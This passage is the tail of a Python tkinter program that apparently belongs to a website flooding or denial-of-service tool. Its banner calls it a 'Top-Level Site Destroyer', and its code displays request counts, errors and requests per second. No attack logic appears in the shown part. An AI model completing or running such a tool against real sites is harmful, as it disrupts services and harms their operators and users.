        self.stop_btn.config(state=tk.DISABLED)
    
    def stats_updater(self):
        if self.stats['running']:
            s = self.stats
            elapsed = time.time() - s['start_time'] if s['start_time'] else 1
            rps = s['requests'] / elapsed if elapsed > 0 else 0
            self.requests_var.set(f"Requests: {s['requests']:,} | Errors: {s['errors']:,}")
            self.rps_var.set(f"RPS: {rps:,.0f} | Elapsed: {elapsed:.1f}s")
        self.root.after(200, self.stats_updater)
    
    def run(self):
        self.root.mainloop()

# ═══════════ MAIN ENTRY ═══════════
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════╗
    ║   💀 DEVILS APEX PREDATOR v4.0 💀               ║
    ║   Top-Level Site Destroyer                      ║
    ║   Owner: @UnknownGuy9876 | @SGCodexs            ║
    ╚══════════════════════════════════════════════════╝
    """)
    app = ApexPredatorGUI()
    app.run()
